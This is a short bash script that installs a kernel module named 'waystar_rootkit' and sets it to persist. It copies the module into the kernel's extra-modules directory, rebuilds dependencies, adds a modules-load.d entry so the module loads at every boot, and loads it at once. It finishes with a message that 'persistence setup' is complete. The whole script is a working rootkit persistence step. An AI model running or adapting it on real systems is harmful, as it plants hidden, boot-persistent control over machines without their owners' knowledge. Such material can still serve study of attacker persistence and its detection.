#!/bin/bash

MODULE_NAME="waystar_rootkit"
MODULE_FILE="${MODULE_NAME}.ko"
TARGET_DIR="/lib/modules/$(uname -r)/extra"

# 1. Create target directory if needed
sudo mkdir -p "$TARGET_DIR"

# 2. Copy the module
echo "[+] Copying $MODULE_FILE to $TARGET_DIR"
sudo cp "$MODULE_FILE" "$TARGET_DIR"

# 3. Rebuild module dependencies
echo "[+] Running depmod"
sudo depmod

# 4. Create module load config
CONF_PATH="/etc/modules-load.d/${MODULE_NAME}.conf"
echo "[+] Creating $CONF_PATH"
echo "$MODULE_NAME" | sudo tee "$CONF_PATH" > /dev/null

# 5. (Optional) Try loading it now
echo "[+] Loading module now (if not already loaded)"
sudo modprobe "$MODULE_NAME"

echo "[✔] Persistence setup complete. The module will load at next boot."
